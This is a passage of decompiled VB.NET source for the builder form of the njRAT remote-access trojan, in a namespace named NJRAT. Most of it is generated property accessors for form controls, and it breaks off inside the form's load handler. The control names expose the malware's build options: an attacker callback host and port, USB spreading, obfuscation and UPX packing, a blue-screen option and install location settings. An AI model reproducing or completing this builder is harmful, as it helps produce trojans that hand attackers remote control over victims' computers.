Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Text
Imports System.Threading
Imports System.Windows.Forms
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports NJRAT.My
Imports NJRAT.My.Resources

Namespace NJRAT
	' Token: 0x0200000A RID: 10
	<DesignerGenerated()>
	Public Partial Class Builder
		Inherits Form

		' Token: 0x060000CC RID: 204 RVA: 0x00008C94 File Offset: 0x00006E94
		<DebuggerNonUserCode()>
		Private Shared Sub __ENCAddToList(value As Object)
			Dim _ENCList As List(Of WeakReference) = Builder.__ENCList
			SyncLock _ENCList
				If Builder.__ENCList.Count = Builder.__ENCList.Capacity Then
					Dim num As Integer = 0
					Dim num2 As Integer = 0
					Dim num3 As Integer = Builder.__ENCList.Count - 1
					Dim num4 As Integer = num2
					While True
						Dim num5 As Integer = num4
						Dim num6 As Integer = num3
						If num5 > num6 Then
							Exit For
						End If
						Dim weakReference As WeakReference = Builder.__ENCList(num4)
						If weakReference.IsAlive Then
							If num4 <> num Then
								Builder.__ENCList(num) = Builder.__ENCList(num4)
							End If
							num += 1
						End If
						num4 += 1
					End While
					Builder.__ENCList.RemoveRange(num, Builder.__ENCList.Count - num)
					Builder.__ENCList.Capacity = Builder.__ENCList.Count
				End If
				Builder.__ENCList.Add(New WeakReference(RuntimeHelpers.GetObjectValue(value)))
			End SyncLock
		End Sub

		' Token: 0x1700004D RID: 77
		' (get) Token: 0x060000CF RID: 207 RVA: 0x0000C2D4 File Offset: 0x0000A4D4
		' (set) Token: 0x060000D0 RID: 208 RVA: 0x000022B8 File Offset: 0x000004B8
		Friend Overridable Property T1 As TextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._T1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TextBox)
				Me._T1 = value
			End Set
		End Property

		' Token: 0x1700004E RID: 78
		' (get) Token: 0x060000D1 RID: 209 RVA: 0x0000C2EC File Offset: 0x0000A4EC
		' (set) Token: 0x060000D2 RID: 210 RVA: 0x000022C1 File Offset: 0x000004C1
		Friend Overridable Property FormSkin1 As FormSkin
			<DebuggerNonUserCode()>
			Get
				Return Me._FormSkin1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As FormSkin)
				Me._FormSkin1 = value
			End Set
		End Property

		' Token: 0x1700004F RID: 79
		' (get) Token: 0x060000D3 RID: 211 RVA: 0x0000C304 File Offset: 0x0000A504
		' (set) Token: 0x060000D4 RID: 212 RVA: 0x000022CA File Offset: 0x000004CA
		Friend Overridable Property FlatTabControl1 As FlatTabControl
			<DebuggerNonUserCode()>
			Get
				Return Me._FlatTabControl1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As FlatTabControl)
				Me._FlatTabControl1 = value
			End Set
		End Property

		' Token: 0x17000050 RID: 80
		' (get) Token: 0x060000D5 RID: 213 RVA: 0x0000C31C File Offset: 0x0000A51C
		' (set) Token: 0x060000D6 RID: 214 RVA: 0x0000C334 File Offset: 0x0000A534
		Friend Overridable Property TabPage1 As TabPage
			<DebuggerNonUserCode()>
			Get
				Return Me._TabPage1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TabPage)
				Dim value2 As EventHandler = AddressOf Me.TabPage1_Click
				If Me._TabPage1 IsNot Nothing Then
					RemoveHandler Me._TabPage1.Click, value2
				End If
				Me._TabPage1 = value
				If Me._TabPage1 IsNot Nothing Then
					AddHandler Me._TabPage1.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000051 RID: 81
		' (get) Token: 0x060000D7 RID: 215 RVA: 0x0000C38C File Offset: 0x0000A58C
		' (set) Token: 0x060000D8 RID: 216 RVA: 0x000022D3 File Offset: 0x000004D3
		Friend Overridable Property TabPage2 As TabPage
			<DebuggerNonUserCode()>
			Get
				Return Me._TabPage2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TabPage)
				Me._TabPage2 = value
			End Set
		End Property

		' Token: 0x17000052 RID: 82
		' (get) Token: 0x060000D9 RID: 217 RVA: 0x0000C3A4 File Offset: 0x0000A5A4
		' (set) Token: 0x060000DA RID: 218 RVA: 0x000022DC File Offset: 0x000004DC
		Friend Overridable Property TabPage3 As TabPage
			<DebuggerNonUserCode()>
			Get
				Return Me._TabPage3
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TabPage)
				Me._TabPage3 = value
			End Set
		End Property

		' Token: 0x17000053 RID: 83
		' (get) Token: 0x060000DB RID: 219 RVA: 0x0000C3BC File Offset: 0x0000A5BC
		' (set) Token: 0x060000DC RID: 220 RVA: 0x000022E5 File Offset: 0x000004E5
		Friend Overridable Property CheckBox5 As CheckBox
			<DebuggerNonUserCode()>
			Get
				Return Me._CheckBox5
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As CheckBox)
				Me._CheckBox5 = value
			End Set
		End Property

		' Token: 0x17000054 RID: 84
		' (get) Token: 0x060000DD RID: 221 RVA: 0x0000C3D4 File Offset: 0x0000A5D4
		' (set) Token: 0x060000DE RID: 222 RVA: 0x000022EE File Offset: 0x000004EE
		Friend Overridable Property Label14 As Label
			<DebuggerNonUserCode()>
			Get
				Return Me._Label14
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Me._Label14 = value
			End Set
		End Property

		' Token: 0x17000055 RID: 85
		' (get) Token: 0x060000DF RID: 223 RVA: 0x0000C3EC File Offset: 0x0000A5EC
		' (set) Token: 0x060000E0 RID: 224 RVA: 0x000022F7 File Offset: 0x000004F7
		Friend Overridable Property NumericUpDown1 As NumericUpDown
			<DebuggerNonUserCode()>
			Get
				Return Me._NumericUpDown1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As NumericUpDown)
				Me._NumericUpDown1 = value
			End Set
		End Property

		' Token: 0x17000056 RID: 86
		' (get) Token: 0x060000E1 RID: 225 RVA: 0x0000C404 File Offset: 0x0000A604
		' (set) Token: 0x060000E2 RID: 226 RVA: 0x00002300 File Offset: 0x00000500
		Friend Overridable Property CheckBox6 As CheckBox
			<DebuggerNonUserCode()>
			Get
				Return Me._CheckBox6
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As CheckBox)
				Me._CheckBox6 = value
			End Set
		End Property

		' Token: 0x17000057 RID: 87
		' (get) Token: 0x060000E3 RID: 227 RVA: 0x0000C41C File Offset: 0x0000A61C
		' (set) Token: 0x060000E4 RID: 228 RVA: 0x00002309 File Offset: 0x00000509
		Friend Overridable Property CheckBox4 As CheckBox
			<DebuggerNonUserCode()>
			Get
				Return Me._CheckBox4
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As CheckBox)
				Me._CheckBox4 = value
			End Set
		End Property

		' Token: 0x17000058 RID: 88
		' (get) Token: 0x060000E5 RID: 229 RVA: 0x0000C434 File Offset: 0x0000A634
		' (set) Token: 0x060000E6 RID: 230 RVA: 0x00002312 File Offset: 0x00000512
		Friend Overridable Property CheckBox3 As CheckBox
			<DebuggerNonUserCode()>
			Get
				Return Me._CheckBox3
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As CheckBox)
				Me._CheckBox3 = value
			End Set
		End Property

		' Token: 0x17000059 RID: 89
		' (get) Token: 0x060000E7 RID: 231 RVA: 0x0000C44C File Offset: 0x0000A64C
		' (set) Token: 0x060000E8 RID: 232 RVA: 0x0000231B File Offset: 0x0000051B
		Friend Overridable Property CheckBox2 As CheckBox
			<DebuggerNonUserCode()>
			Get
				Return Me._CheckBox2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As CheckBox)
				Me._CheckBox2 = value
			End Set
		End Property

		' Token: 0x1700005A RID: 90
		' (get) Token: 0x060000E9 RID: 233 RVA: 0x0000C464 File Offset: 0x0000A664
		' (set) Token: 0x060000EA RID: 234 RVA: 0x00002324 File Offset: 0x00000524
		Friend Overridable Property CheckBox1 As CheckBox
			<DebuggerNonUserCode()>
			Get
				Return Me._CheckBox1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As CheckBox)
				Me._CheckBox1 = value
			End Set
		End Property

		' Token: 0x1700005B RID: 91
		' (get) Token: 0x060000EB RID: 235 RVA: 0x0000C47C File Offset: 0x0000A67C
		' (set) Token: 0x060000EC RID: 236 RVA: 0x0000232D File Offset: 0x0000052D
		Friend Overridable Property GroupBox2 As GroupBox
			<DebuggerNonUserCode()>
			Get
				Return Me._GroupBox2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As GroupBox)
				Me._GroupBox2 = value
			End Set
		End Property

		' Token: 0x1700005C RID: 92
		' (get) Token: 0x060000ED RID: 237 RVA: 0x0000C494 File Offset: 0x0000A694
		' (set) Token: 0x060000EE RID: 238 RVA: 0x00002336 File Offset: 0x00000536
		Friend Overridable Property port As NumericUpDown
			<DebuggerNonUserCode()>
			Get
				Return Me._port
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As NumericUpDown)
				Me._port = value
			End Set
		End Property

		' Token: 0x1700005D RID: 93
		' (get) Token: 0x060000EF RID: 239 RVA: 0x0000C4AC File Offset: 0x0000A6AC
		' (set) Token: 0x060000F0 RID: 240 RVA: 0x0000233F File Offset: 0x0000053F
		Friend Overridable Property Button2 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Me._Button2 = value
			End Set
		End Property

		' Token: 0x1700005E RID: 94
		' (get) Token: 0x060000F1 RID: 241 RVA: 0x0000C4C4 File Offset: 0x0000A6C4
		' (set) Token: 0x060000F2 RID: 242 RVA: 0x00002348 File Offset: 0x00000548
		Friend Overridable Property Label10 As Label
			<DebuggerNonUserCode()>
			Get
				Return Me._Label10
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Me._Label10 = value
			End Set
		End Property

		' Token: 0x1700005F RID: 95
		' (get) Token: 0x060000F3 RID: 243 RVA: 0x0000C4DC File Offset: 0x0000A6DC
		' (set) Token: 0x060000F4 RID: 244 RVA: 0x00002351 File Offset: 0x00000551
		Friend Overridable Property TextBox4 As TextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._TextBox4
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TextBox)
				Me._TextBox4 = value
			End Set
		End Property

		' Token: 0x17000060 RID: 96
		' (get) Token: 0x060000F5 RID: 245 RVA: 0x0000C4F4 File Offset: 0x0000A6F4
		' (set) Token: 0x060000F6 RID: 246 RVA: 0x0000235A File Offset: 0x0000055A
		Friend Overridable Property TextBox3 As TextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._TextBox3
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TextBox)
				Me._TextBox3 = value
			End Set
		End Property

		' Token: 0x17000061 RID: 97
		' (get) Token: 0x060000F7 RID: 247 RVA: 0x0000C50C File Offset: 0x0000A70C
		' (set) Token: 0x060000F8 RID: 248 RVA: 0x00002363 File Offset: 0x00000563
		Friend Overridable Property Label9 As Label
			<DebuggerNonUserCode()>
			Get
				Return Me._Label9
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Me._Label9 = value
			End Set
		End Property

		' Token: 0x17000062 RID: 98
		' (get) Token: 0x060000F9 RID: 249 RVA: 0x0000C524 File Offset: 0x0000A724
		' (set) Token: 0x060000FA RID: 250 RVA: 0x0000236C File Offset: 0x0000056C
		Friend Overridable Property Label8 As Label
			<DebuggerNonUserCode()>
			Get
				Return Me._Label8
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Me._Label8 = value
			End Set
		End Property

		' Token: 0x17000063 RID: 99
		' (get) Token: 0x060000FB RID: 251 RVA: 0x0000C53C File Offset: 0x0000A73C
		' (set) Token: 0x060000FC RID: 252 RVA: 0x00002375 File Offset: 0x00000575
		Friend Overridable Property Label7 As Label
			<DebuggerNonUserCode()>
			Get
				Return Me._Label7
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Me._Label7 = value
			End Set
		End Property

		' Token: 0x17000064 RID: 100
		' (get) Token: 0x060000FD RID: 253 RVA: 0x0000C554 File Offset: 0x0000A754
		' (set) Token: 0x060000FE RID: 254 RVA: 0x0000237E File Offset: 0x0000057E
		Friend Overridable Property TextBox2 As TextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._TextBox2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TextBox)
				Me._TextBox2 = value
			End Set
		End Property

		' Token: 0x17000065 RID: 101
		' (get) Token: 0x060000FF RID: 255 RVA: 0x0000C56C File Offset: 0x0000A76C
		' (set) Token: 0x06000100 RID: 256 RVA: 0x00002387 File Offset: 0x00000587
		Friend Overridable Property TextBox1 As TextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._TextBox1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TextBox)
				Me._TextBox1 = value
			End Set
		End Property

		' Token: 0x17000066 RID: 102
		' (get) Token: 0x06000101 RID: 257 RVA: 0x0000C584 File Offset: 0x0000A784
		' (set) Token: 0x06000102 RID: 258 RVA: 0x00002390 File Offset: 0x00000590
		Friend Overridable Property host As TextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._host
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TextBox)
				Me._host = value
			End Set
		End Property

		' Token: 0x17000067 RID: 103
		' (get) Token: 0x06000103 RID: 259 RVA: 0x0000C59C File Offset: 0x0000A79C
		' (set) Token: 0x06000104 RID: 260 RVA: 0x00002399 File Offset: 0x00000599
		Friend Overridable Property Label2 As Label
			<DebuggerNonUserCode()>
			Get
				Return Me._Label2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Me._Label2 = value
			End Set
		End Property

		' Token: 0x17000068 RID: 104
		' (get) Token: 0x06000105 RID: 261 RVA: 0x0000C5B4 File Offset: 0x0000A7B4
		' (set) Token: 0x06000106 RID: 262 RVA: 0x000023A2 File Offset: 0x000005A2
		Friend Overridable Property CKUpx As CheckBox
			<DebuggerNonUserCode()>
			Get
				Return Me._CKUpx
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As CheckBox)
				Me._CKUpx = value
			End Set
		End Property

		' Token: 0x17000069 RID: 105
		' (get) Token: 0x06000107 RID: 263 RVA: 0x0000C5CC File Offset: 0x0000A7CC
		' (set) Token: 0x06000108 RID: 264 RVA: 0x000023AB File Offset: 0x000005AB
		Friend Overridable Property Label1 As Label
			<DebuggerNonUserCode()>
			Get
				Return Me._Label1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Me._Label1 = value
			End Set
		End Property

		' Token: 0x1700006A RID: 106
		' (get) Token: 0x06000109 RID: 265 RVA: 0x0000C5E4 File Offset: 0x0000A7E4
		' (set) Token: 0x0600010A RID: 266 RVA: 0x000023B4 File Offset: 0x000005B4
		Friend Overridable Property CKOBF As CheckBox
			<DebuggerNonUserCode()>
			Get
				Return Me._CKOBF
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As CheckBox)
				Me._CKOBF = value
			End Set
		End Property

		' Token: 0x1700006B RID: 107
		' (get) Token: 0x0600010B RID: 267 RVA: 0x0000C5FC File Offset: 0x0000A7FC
		' (set) Token: 0x0600010C RID: 268 RVA: 0x000023BD File Offset: 0x000005BD
		Friend Overridable Property USB_SP As CheckBox
			<DebuggerNonUserCode()>
			Get
				Return Me._USB_SP
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As CheckBox)
				Me._USB_SP = value
			End Set
		End Property

		' Token: 0x1700006C RID: 108
		' (get) Token: 0x0600010D RID: 269 RVA: 0x0000C614 File Offset: 0x0000A814
		' (set) Token: 0x0600010E RID: 270 RVA: 0x000023C6 File Offset: 0x000005C6
		Friend Overridable Property Anti_CH As CheckBox
			<DebuggerNonUserCode()>
			Get
				Return Me._Anti_CH
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As CheckBox)
				Me._Anti_CH = value
			End Set
		End Property

		' Token: 0x1700006D RID: 109
		' (get) Token: 0x0600010F RID: 271 RVA: 0x0000C62C File Offset: 0x0000A82C
		' (set) Token: 0x06000110 RID: 272 RVA: 0x000023CF File Offset: 0x000005CF
		Friend Overridable Property Label6 As Label
			<DebuggerNonUserCode()>
			Get
				Return Me._Label6
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Me._Label6 = value
			End Set
		End Property

		' Token: 0x1700006E RID: 110
		' (get) Token: 0x06000111 RID: 273 RVA: 0x0000C644 File Offset: 0x0000A844
		' (set) Token: 0x06000112 RID: 274 RVA: 0x000023D8 File Offset: 0x000005D8
		Friend Overridable Property klen As NumericUpDown
			<DebuggerNonUserCode()>
			Get
				Return Me._klen
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As NumericUpDown)
				Me._klen = value
			End Set
		End Property

		' Token: 0x1700006F RID: 111
		' (get) Token: 0x06000113 RID: 275 RVA: 0x0000C65C File Offset: 0x0000A85C
		' (set) Token: 0x06000114 RID: 276 RVA: 0x000023E1 File Offset: 0x000005E1
		Friend Overridable Property Isu As CheckBox
			<DebuggerNonUserCode()>
			Get
				Return Me._Isu
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As CheckBox)
				Me._Isu = value
			End Set
		End Property

		' Token: 0x17000070 RID: 112
		' (get) Token: 0x06000115 RID: 277 RVA: 0x0000C674 File Offset: 0x0000A874
		' (set) Token: 0x06000116 RID: 278 RVA: 0x000023EA File Offset: 0x000005EA
		Friend Overridable Property Isf As CheckBox
			<DebuggerNonUserCode()>
			Get
				Return Me._Isf
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As CheckBox)
				Me._Isf = value
			End Set
		End Property

		' Token: 0x17000071 RID: 113
		' (get) Token: 0x06000117 RID: 279 RVA: 0x0000C68C File Offset: 0x0000A88C
		' (set) Token: 0x06000118 RID: 280 RVA: 0x000023F3 File Offset: 0x000005F3
		Friend Overridable Property bsod As CheckBox
			<DebuggerNonUserCode()>
			Get
				Return Me._bsod
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As CheckBox)
				Me._bsod = value
			End Set
		End Property

		' Token: 0x17000072 RID: 114
		' (get) Token: 0x06000119 RID: 281 RVA: 0x0000C6A4 File Offset: 0x0000A8A4
		' (set) Token: 0x0600011A RID: 282 RVA: 0x000023FC File Offset: 0x000005FC
		Friend Overridable Property VN As TextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._VN
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TextBox)
				Me._VN = value
			End Set
		End Property

		' Token: 0x17000073 RID: 115
		' (get) Token: 0x0600011B RID: 283 RVA: 0x0000C6BC File Offset: 0x0000A8BC
		' (set) Token: 0x0600011C RID: 284 RVA: 0x00002405 File Offset: 0x00000605
		Friend Overridable Property Label5 As Label
			<DebuggerNonUserCode()>
			Get
				Return Me._Label5
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Me._Label5 = value
			End Set
		End Property

		' Token: 0x17000074 RID: 116
		' (get) Token: 0x0600011D RID: 285 RVA: 0x0000C6D4 File Offset: 0x0000A8D4
		' (set) Token: 0x0600011E RID: 286 RVA: 0x0000C6EC File Offset: 0x0000A8EC
		Friend Overridable Property Button1 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button1_Click_1
				If Me._Button1 IsNot Nothing Then
					RemoveHandler Me._Button1.Click, value2
				End If
				Me._Button1 = value
				If Me._Button1 IsNot Nothing Then
					AddHandler Me._Button1.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000075 RID: 117
		' (get) Token: 0x0600011F RID: 287 RVA: 0x0000C744 File Offset: 0x0000A944
		' (set) Token: 0x06000120 RID: 288 RVA: 0x0000240E File Offset: 0x0000060E
		Friend Overridable Property GroupBox1 As GroupBox
			<DebuggerNonUserCode()>
			Get
				Return Me._GroupBox1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As GroupBox)
				Me._GroupBox1 = value
			End Set
		End Property

		' Token: 0x17000076 RID: 118
		' (get) Token: 0x06000121 RID: 289 RVA: 0x0000C75C File Offset: 0x0000A95C
		' (set) Token: 0x06000122 RID: 290 RVA: 0x00002417 File Offset: 0x00000617
		Friend Overridable Property CheckBox9 As CheckBox
			<DebuggerNonUserCode()>
			Get
				Return Me._CheckBox9
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As CheckBox)
				Me._CheckBox9 = value
			End Set
		End Property

		' Token: 0x17000077 RID: 119
		' (get) Token: 0x06000123 RID: 291 RVA: 0x0000C774 File Offset: 0x0000A974
		' (set) Token: 0x06000124 RID: 292 RVA: 0x00002420 File Offset: 0x00000620
		Friend Overridable Property CheckBox8 As CheckBox
			<DebuggerNonUserCode()>
			Get
				Return Me._CheckBox8
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As CheckBox)
				Me._CheckBox8 = value
			End Set
		End Property

		' Token: 0x17000078 RID: 120
		' (get) Token: 0x06000125 RID: 293 RVA: 0x0000C78C File Offset: 0x0000A98C
		' (set) Token: 0x06000126 RID: 294 RVA: 0x00002429 File Offset: 0x00000629
		Friend Overridable Property CheckBox7 As CheckBox
			<DebuggerNonUserCode()>
			Get
				Return Me._CheckBox7
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As CheckBox)
				Me._CheckBox7 = value
			End Set
		End Property

		' Token: 0x17000079 RID: 121
		' (get) Token: 0x06000127 RID: 295 RVA: 0x0000C7A4 File Offset: 0x0000A9A4
		' (set) Token: 0x06000128 RID: 296 RVA: 0x00002432 File Offset: 0x00000632
		Friend Overridable Property TextBox7 As TextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._TextBox7
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TextBox)
				Me._TextBox7 = value
			End Set
		End Property

		' Token: 0x1700007A RID: 122
		' (get) Token: 0x06000129 RID: 297 RVA: 0x0000C7BC File Offset: 0x0000A9BC
		' (set) Token: 0x0600012A RID: 298 RVA: 0x0000243B File Offset: 0x0000063B
		Friend Overridable Property TextBox6 As TextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._TextBox6
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TextBox)
				Me._TextBox6 = value
			End Set
		End Property

		' Token: 0x1700007B RID: 123
		' (get) Token: 0x0600012B RID: 299 RVA: 0x0000C7D4 File Offset: 0x0000A9D4
		' (set) Token: 0x0600012C RID: 300 RVA: 0x00002444 File Offset: 0x00000644
		Friend Overridable Property TextBox5 As TextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._TextBox5
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TextBox)
				Me._TextBox5 = value
			End Set
		End Property

		' Token: 0x1700007C RID: 124
		' (get) Token: 0x0600012D RID: 301 RVA: 0x0000C7EC File Offset: 0x0000A9EC
		' (set) Token: 0x0600012E RID: 302 RVA: 0x0000244D File Offset: 0x0000064D
		Friend Overridable Property Label11 As Label
			<DebuggerNonUserCode()>
			Get
				Return Me._Label11
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Me._Label11 = value
			End Set
		End Property

		' Token: 0x1700007D RID: 125
		' (get) Token: 0x0600012F RID: 303 RVA: 0x0000C804 File Offset: 0x0000AA04
		' (set) Token: 0x06000130 RID: 304 RVA: 0x0000C81C File Offset: 0x0000AA1C
		Friend Overridable Property Idr As CheckBox
			<DebuggerNonUserCode()>
			Get
				Return Me._Idr
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As CheckBox)
				Dim value2 As EventHandler = AddressOf Me.Idr_CheckedChanged_1
				If Me._Idr IsNot Nothing Then
					RemoveHandler Me._Idr.CheckedChanged, value2
				End If
				Me._Idr = value
				If Me._Idr IsNot Nothing Then
					AddHandler Me._Idr.CheckedChanged, value2
				End If
			End Set
		End Property

		' Token: 0x1700007E RID: 126
		' (get) Token: 0x06000131 RID: 305 RVA: 0x0000C874 File Offset: 0x0000AA74
		' (set) Token: 0x06000132 RID: 306 RVA: 0x00002456 File Offset: 0x00000656
		Friend Overridable Property dir As ComboBox
			<DebuggerNonUserCode()>
			Get
				Return Me._dir
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ComboBox)
				Me._dir = value
			End Set
		End Property

		' Token: 0x1700007F RID: 127
		' (get) Token: 0x06000133 RID: 307 RVA: 0x0000C88C File Offset: 0x0000AA8C
		' (set) Token: 0x06000134 RID: 308 RVA: 0x0000245F File Offset: 0x0000065F
		Friend Overridable Property Label4 As Label
			<DebuggerNonUserCode()>
			Get
				Return Me._Label4
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Me._Label4 = value
			End Set
		End Property

		' Token: 0x17000080 RID: 128
		' (get) Token: 0x06000135 RID: 309 RVA: 0x0000C8A4 File Offset: 0x0000AAA4
		' (set) Token: 0x06000136 RID: 310 RVA: 0x00002468 File Offset: 0x00000668
		Friend Overridable Property exe As TextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._exe
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TextBox)
				Me._exe = value
			End Set
		End Property

		' Token: 0x17000081 RID: 129
		' (get) Token: 0x06000137 RID: 311 RVA: 0x0000C8BC File Offset: 0x0000AABC
		' (set) Token: 0x06000138 RID: 312 RVA: 0x00002471 File Offset: 0x00000671
		Friend Overridable Property Label3 As Label
			<DebuggerNonUserCode()>
			Get
				Return Me._Label3
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Me._Label3 = value
			End Set
		End Property

		' Token: 0x17000082 RID: 130
		' (get) Token: 0x06000139 RID: 313 RVA: 0x0000C8D4 File Offset: 0x0000AAD4
		' (set) Token: 0x0600013A RID: 314 RVA: 0x0000247A File Offset: 0x0000067A
		Friend Overridable Property UserImage1 As UserImage
			<DebuggerNonUserCode()>
			Get
				Return Me._UserImage1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As UserImage)
				Me._UserImage1 = value
			End Set
		End Property

		' Token: 0x17000083 RID: 131
		' (get) Token: 0x0600013B RID: 315 RVA: 0x0000C8EC File Offset: 0x0000AAEC
		' (set) Token: 0x0600013C RID: 316 RVA: 0x0000C904 File Offset: 0x0000AB04
		Friend Overridable Property PictureBox1 As PictureBox
			<DebuggerNonUserCode()>
			Get
				Return Me._PictureBox1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As PictureBox)
				Dim value2 As EventHandler = AddressOf Me.PictureBox1_Click
				If Me._PictureBox1 IsNot Nothing Then
					RemoveHandler Me._PictureBox1.Click, value2
				End If
				Me._PictureBox1 = value
				If Me._PictureBox1 IsNot Nothing Then
					AddHandler Me._PictureBox1.Click, value2
				End If
			End Set
		End Property

		' Token: 0x0600013D RID: 317 RVA: 0x00002483 File Offset: 0x00000683
		Public Sub New()
			AddHandler MyBase.Load, AddressOf Me.Builder_Load
			Builder.__ENCAddToList(Me)
			Me.string_0 = Nothing
			Me.InitializeComponent()
		End Sub

		' Token: 0x0600013E RID: 318 RVA: 0x0000C95C File Offset: 0x0000AB5C
		Private Sub Builder_Load(sender As Object, e As EventArgs)
			Me.CKUpx.Visible = False
			Me.Icon = Resources.icon
			Me.dir.SelectedIndex = 0
